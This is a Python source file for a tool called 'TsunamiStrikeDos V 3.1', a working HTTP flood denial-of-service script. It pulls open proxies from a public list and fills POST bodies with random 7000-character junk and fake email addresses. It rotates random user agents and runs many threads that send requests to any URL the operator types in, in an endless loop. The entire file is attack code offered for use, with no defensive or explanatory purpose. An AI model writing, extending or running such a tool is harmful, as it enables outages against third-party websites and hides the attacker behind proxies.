import json
import random
import sys
import warnings
import string
import threading
from typing import Dict, List
import requests
import faker
from colorama import Fore as F
from requests.exceptions import ConnectionError, Timeout
from fake_useragent import UserAgent
# --------------------------------------

print(f'''
{F.GREEN}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                {F.CYAN} TsunamiStrikeDos {F.GREEN}V 3.1 {F.RESET}
''')


# -------------------------------------------


fake = faker.Faker()

def emailCreateFake():

    e = string.ascii_lowercase + string.digits + string.digits
    leng = random.randint(6,10)

    email_1 = ''.join(
        random.choice(e) for _ in range(leng)
    )
    listMe = [
        '@hotmail.com',
        '@live.com',
        '@gmail.com',
        '@yahoo.com'
    ]
    ranListMe = random.choice(listMe)
    email = email_1 + ranListMe
    return email

def dataRandom():

    return {
        'name': ''.join(random.choices(string.ascii_letters, k=7000)),
        'message2': ''.join(random.choices(string.ascii_letters + string.digits+"~!@#$%^&*()", k=7000)),
        'email': emailCreateFake()
    }



warnings.filterwarnings("ignore", message="Unverified HTTPS request")

def get_http_proxies() -> List[Dict[str, str]]:
    """Return a dictionary of available proxies using http protocol.

    Args:
        None

    Returns:
        - proxies - A dictionary containing http proxies in the form of address:port paired values
    """
    fakedata=dataRandom()
    try:
        with requests.get(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            verify=False,
        ) as proxy_list:
            proxies = [
                {"http": proxy, "https": proxy}
                for proxy in proxy_list.text.split("\r\n")
                if proxy != ""
            ]

    except Timeout:
        print(
            f"\n{F.RED}[ !!! ] {F.CYAN}It was not possible to connect to the proxies!{F.RESET}"
        )
        sys.exit(1)
    except ConnectionError:
        print(f"\n{F.RED}[ !!! ] {F.CYAN}Device is not connected to the Internet!{F.RESET}")
        sys.exit(1)

    return proxies

proxies = get_http_proxies()
color_code = {True: F.GREEN, False: F.RED}

# Create UserAgent instance
ua = UserAgent()

def flood(target: str) -> None:
    """Start an HTTP GET request flood through proxies.

    Args:
        - target - Target's URL

    Returns:
        None
    """
    global proxies
    fakedata = dataRandom()
    while True:  # Keep flooding until the program is stopped
        headers = {
            "User-Agent": str(ua.random),  # Use a random User-Agent
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Accept-Encoding": "gzip, deflate, br",
        }

        try:
            proxy = random.choice(proxies)
            response = requests.post(target, data=fakedata,headers=headers,json=fakedata,proxies=proxy,timeout=5)
        except (Timeout, OSError):
            continue
        else:
            status = (
                f"{color_code[response.status_code == 200]}{response.status_code}"
            )
            payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
            proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
            print(f"({status}) Request Sent!{F.RESET} --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
            if not response.status_code:
                try:
                    proxies.remove(proxy)
                except ValueError:
                    proxies = get_http_proxies()

def start_flooding(target: str, thread_count: int) -> None:
    """Start multiple threads to flood the target.

    Args:
        - target: Target's URL
        - thread_count: Number of threads to use

    Returns:
        None
    """
    for _ in range(thread_count):
        thread = threading.Thread(target=flood, args=(target,))
        thread.daemon = True  # Allow threads to exit when main program exits
        thread.start()

if __name__ == "__main__":
    target_url = input(f"{F.CYAN}[?]{F.RESET} Enter the target URL: {F.GREEN}")
    num_threads = int(input(f"{F.CYAN}[?]{F.RESET} Enter the number of threads: {F.GREEN}"))
    start_flooding(target_url, num_threads)

        # Keep the main thread alive
    while True:
        pass
